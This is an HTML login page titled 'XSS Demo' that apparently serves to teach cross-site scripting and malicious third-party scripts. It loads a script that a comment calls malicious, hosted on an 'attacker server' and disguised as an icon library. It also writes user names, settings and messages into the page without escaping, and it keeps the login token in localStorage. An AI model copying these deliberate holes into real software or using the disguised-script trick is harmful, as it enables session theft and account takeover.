<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>XSS Demo</title>
  </head>
  <body>
    <h1>Login</h1>
    <input id="email" placeholder="Email" />
    <input id="password" type="password" placeholder="Password" />
    <button onclick="login()">Login</button>

    <h2>User Info</h2>
    <div id="userInfo" style="font-family: sans-serif; padding: 1rem; border: 1px solid #ccc; border-radius: 8px; max-width: 500px; background: #f9f9f9;"></div>


    <!-- ✅ Malicious script hosted on attacker server -->
    <script src="http://localhost:5000/icons.js"></script>

    <!-- ✅ Legit frontend logic -->
    <script>
      async function login() {
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
      
        const res = await fetch('http://localhost:4000/api/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email, password })
        });
      
        const data = await res.json();
      
        if (data.token) {
          localStorage.setItem('token', data.token);
          loadUser();
        } else {
          alert('Login failed');
        }
      }

      async function loadUser() {
        const token = localStorage.getItem('token');
        if (!token) return;
      
        const res = await fetch('http://localhost:4000/api/user', {
          headers: { Authorization: `Bearer ${token}` }
        });
      
        const user = await res.json();
        const userInfo = document.getElementById('userInfo');
      
        userInfo.innerHTML = `
          <h3>User Profile</h3>
          <p><strong>Name:</strong> ${user.name}</p>
          <p><strong>Email:</strong> ${user.email}</p>
          <p><strong>Admin:</strong> ${user.isAdmin ? '✅ Yes' : '❌ No'}</p>
      
          <h4>Settings</h4>
          <ul>
            <li><strong>Theme:</strong> ${user.settings?.theme}</li>
            <li><strong>Notifications:</strong> ${user.settings?.notifications ? 'Enabled 🔔' : 'Disabled 🔕'}</li>
          </ul>
      
          <h4>Messages</h4>
          <ul>
            ${(user.messages || []).map(msg =>
              `<li><strong>From:</strong> ${msg.from}<br><strong>Message:</strong> ${msg.content}</li>`
            ).join('')}
          </ul>
        `;
        const icon = Icon({ name: 'check', size: 18, color: 'orange' });
        document.getElementById('userInfo').before(icon);
      }
      window.addEventListener('DOMContentLoaded', loadUser);
    </script>
  </body>
</html>
